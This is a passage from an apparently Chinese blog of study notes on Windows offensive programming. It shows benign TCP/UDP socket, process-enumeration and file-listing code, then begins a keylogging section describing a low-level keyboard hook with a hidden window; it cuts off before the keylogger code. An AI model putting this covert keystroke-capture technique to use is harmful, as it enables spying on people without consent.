发送或接收数据，比服务端的步骤要少一些，而且代码也差不多。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;Ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 客户端套接字</span></span><br><span class="line">SOCKET ClientSkt;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc_recv</span><span class="params">(LPVOID lpParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> message[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//接收信息</span></span><br><span class="line"><span class="keyword">int</span> out = <span class="number">0</span>;</span><br><span class="line">out = recv((SOCKET)lpParam, message, MAX_PATH, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (out &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">message[out] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;recv from server:%s\n&quot;</span>, message);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">MyConnection</span><span class="params">(LPCSTR serverIP, <span class="keyword">int</span> serverPort)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//WSAStartup初始化</span></span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="keyword">if</span> (WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;WSAStartup Failed!!!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//socket 创建套接字</span></span><br><span class="line"></span><br><span class="line">ClientSkt = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (ClientSkt == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;socket Failed!!!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//配置服务器信息</span></span><br><span class="line">sockaddr_in server_addr;</span><br><span class="line">server_addr.sin_family = AF_INET;</span><br><span class="line">server_addr.sin_port = htons(serverPort);</span><br><span class="line">server_addr.sin_addr.S_un.S_addr = inet_addr(serverIP);</span><br><span class="line"></span><br><span class="line"><span class="comment">//连接到服务端</span></span><br><span class="line"><span class="keyword">if</span> (connect(ClientSkt, (<span class="keyword">const</span> sockaddr*)&amp;server_addr, <span class="keyword">sizeof</span>(server_addr)) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;connect Failed!!! %d&quot;</span>, WSAGetLastError());</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)ThreadProc_recv,(LPVOID)ClientSkt, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LPCSTR mysIP = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> myPort = <span class="number">12345</span>;</span><br><span class="line"><span class="keyword">if</span> (MyConnection(mysIP, myPort))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Connection success!!!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buffer[MAX_PATH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (TRUE)</span><br><span class="line">&#123;</span><br><span class="line">gets_s(buffer, <span class="number">20</span>);</span><br><span class="line">send(ClientSkt, buffer, (<span class="number">1</span> + <span class="built_in">strlen</span>(buffer)), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就在我以为万事大吉的时候，编译出来的程序一直互相无法通讯，焯，接下来就是找问题时间，在经过2个小时的努力后，终于调试发现套接字莫名奇妙会变0，造成的原因是在函数内部重新定义了全局变量。。。也是长个教训。</p><p>最后还是实现了成功通讯，下面看看效果，先打开服务端等待连接，在打开。<br><img src="https://s2.loli.net/2022/01/15/sKm6JIlwcohQFtn.png"></p><h2 id="Socket-UDP"><a href="#Socket-UDP" class="headerlink" title="Socket-UDP"></a>Socket-UDP</h2><p>UDP面向文件传输数据，不能保证可靠传输，可能丢包，并且相对于TCP，没有那么安全，但相对的UPD更加快速，方便，且是一种无连接传输方式，支持一对一，一对多，多对多。</p><p>Socket-UDP的通信实现起来比TCP简单一些，只是需要改变socket创建套接字的第二个参数为SOCK_DGRAM，也就是代表UDP，然后就是需要绑定两个不同的服务器，进行互相通信。</p><p>主要的流程是WSAStartup 进行初始化–&gt; socket 创建套接字–&gt; bind 绑定。sendto函数需要加入发送目标的ip的端口信息。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;Ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable:4996)</span></span><br><span class="line">SOCKET SktUDP;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">MySendMessage</span><span class="params">(LPCSTR sIP, <span class="keyword">int</span> iPort)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">sockaddr_in addr = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> out = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> message[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(message, <span class="number">0</span>, <span class="keyword">sizeof</span>(message));</span><br><span class="line"></span><br><span class="line">addr.sin_family = AF_INET;</span><br><span class="line">addr.sin_port = htons(iPort);</span><br><span class="line">addr.sin_addr.S_un.S_addr = inet_addr(sIP);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> addr_len = <span class="keyword">sizeof</span>(addr);</span><br><span class="line"><span class="comment">//输入信息，发送信息</span></span><br><span class="line">gets_s(message, MAX_PATH);</span><br><span class="line">out = sendto(SktUDP, message, MAX_PATH, <span class="number">0</span>, (sockaddr*)&amp;addr, addr_len);</span><br><span class="line"><span class="keyword">if</span> (out == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, WSAGetLastError());</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc_recvform</span><span class="params">(LPVOID lpParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//接受连接请求</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> message[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">sockaddr_in addr = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> addr_len = <span class="keyword">sizeof</span>(addr);</span><br><span class="line"><span class="keyword">int</span> out = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(message, <span class="number">0</span>, <span class="keyword">sizeof</span>(message));</span><br><span class="line"><span class="comment">//接收信息</span></span><br><span class="line">out = recvfrom(SktUDP, message, MAX_PATH, <span class="number">0</span>,(sockaddr *)&amp;addr, &amp;addr_len);</span><br><span class="line"><span class="keyword">if</span> (out &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;recv from :%s\n&quot;</span>, message);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">MySktUDP</span><span class="params">(LPCSTR sIP, <span class="keyword">int</span> iPort)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//WSAStartup初始化</span></span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="keyword">if</span> (WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;WSAStartup Failed!!!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//socket 创建套接字</span></span><br><span class="line">SktUDP = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (SktUDP == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;socket Failed!!!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//配置服务器信息</span></span><br><span class="line">sockaddr_in server_addr;</span><br><span class="line">server_addr.sin_family = AF_INET;</span><br><span class="line">server_addr.sin_port = htons(iPort);</span><br><span class="line">server_addr.sin_addr.S_un.S_addr = inet_addr(sIP);</span><br><span class="line"></span><br><span class="line"><span class="comment">//绑定服务器</span></span><br><span class="line"><span class="keyword">if</span> (bind(SktUDP, (<span class="keyword">const</span> sockaddr*)&amp;server_addr, <span class="keyword">sizeof</span>(server_addr)) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bind Failed!!!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建线程来接收消息</span></span><br><span class="line">CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)ThreadProc_recvform, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> sIP[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> iPort = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Input IP and Port:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s%d&quot;</span>, sIP, &amp;iPort);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">if</span> (MySktUDP(sIP, iPort))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bind success!!!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Input Dest IP and Dest Port:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s%d&quot;</span>, sIP, &amp;iPort);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">while</span> (TRUE)</span><br><span class="line">&#123;</span><br><span class="line">MySendMessage(sIP, iPort);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意点是输入ip和端口后，需要一个getchar()。</p><p>同样可以使用netstat -an，去查看本地端口情况。</p><p>下面看看效果<br><img src="https://s2.loli.net/2022/01/19/qwLocU9KgZBDhaA.png"></p><h2 id="功能技术"><a href="#功能技术" class="headerlink" title="功能技术"></a>功能技术</h2><h3 id="进程遍历"><a href="#进程遍历" class="headerlink" title="进程遍历"></a>进程遍历</h3><p>很常见的代码，之前APC也写过线程遍历的代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">FindAllProcess</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//存储进程信息的</span></span><br><span class="line">PROCESSENTRY32 pe32 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">pe32.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">HANDLE hp32nasp;</span><br><span class="line"></span><br><span class="line">hp32nasp=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(Process32First(hp32nasp, &amp;pe32)==FALSE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Process32First Failed!!!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ProcessId = %d\n&quot;</span>, pe32.th32ProcessID);</span><br><span class="line"><span class="comment">//进程名为Unicode编码，所以用_tprintf</span></span><br><span class="line">_tprintf(<span class="string">L&quot;ProcessName: %s\n&quot;</span>, pe32.szExeFile);</span><br><span class="line">&#125;<span class="keyword">while</span> (Process32Next(hp32nasp, &amp;pe32));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">FindAllProcess();</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意下进程名是宽字符就行了。</p><h3 id="文件遍历"><a href="#文件遍历" class="headerlink" title="文件遍历"></a>文件遍历</h3><p>之前在分析《恶代》的一个lab见到过，当时也是根据伪代码去写了下。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable:4996)<span class="comment">//可以使用strcm等函数</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ListFiles</span><span class="params">(<span class="keyword">char</span> *dir)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hFind;</span><br><span class="line">    WIN32_FIND_DATAA findData = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    LARGE_INTEGER size;</span><br><span class="line">    <span class="keyword">char</span> dirNew[MAX_PATH];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向目录加通配符，用于搜索第一个文件 </span></span><br><span class="line">    <span class="built_in">sprintf</span>(dirNew, <span class="string">&quot;%s\\*.*&quot;</span>, dir);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    hFind = FindFirstFileA(dirNew, &amp;findData);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 是否是文件夹，</span></span><br><span class="line">        <span class="keyword">if</span> (findData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//并且名称不为&quot;.&quot;或&quot;..&quot;  ,因为每个文件夹都有当前目录，和上一层目录。</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strcmp</span>(findData.cFileName, <span class="string">&quot;.&quot;</span>) != <span class="number">0</span> &amp;&amp; <span class="built_in">strcmp</span>(findData.cFileName, <span class="string">&quot;..&quot;</span>) != <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 将dirNew1设置为搜索到的目录，并进行下一轮搜索 </span></span><br><span class="line">                <span class="keyword">char</span> dirNew1[MAX_PATH];</span><br><span class="line">                <span class="built_in">sprintf</span>(dirNew1, <span class="string">&quot;%s\\%s&quot;</span>, dir, findData.cFileName);</span><br><span class="line">                ListFiles(dirNew1);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//不是文件目录，打印文件绝对路径</span></span><br><span class="line">            <span class="built_in">sprintf</span>(dirNew, <span class="string">&quot;%s\\%s&quot;</span>,dir,findData.cFileName);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, dirNew);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (FindNextFileA(hFind, &amp;findData));</span><br><span class="line"></span><br><span class="line">    FindClose(hFind);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>  dir[<span class="number">100</span>] = <span class="string">&quot;D:\\learning record\\学术报告\\Windows-Hack-Programming&quot;</span>;</span><br><span class="line"></span><br><span class="line">    ListFiles(dir);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="按键记录"><a href="#按键记录" class="headerlink" title="按键记录"></a>按键记录</h3><p>按键记录其实可以分很多种，dll注入的全局钩取，但是那种比较有缺陷，需要64位和32位的都全部钩取，不然会造成某些应用程序卡住。然后就是使用windows自带的Hook函数SetWindowsHookExA，将第一个参数设置为WH_KEYBOARD_LL，就能钩取键盘消息了，也是Lab-3-3的一个例子，感觉比书中的简单一些。然后就是书上的这种了，</p><p>SetWindowsHookExA实现，随便隐藏了下窗口，也要感谢书中提供的虚拟键值的替换表，还不错，省了很多功夫。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span 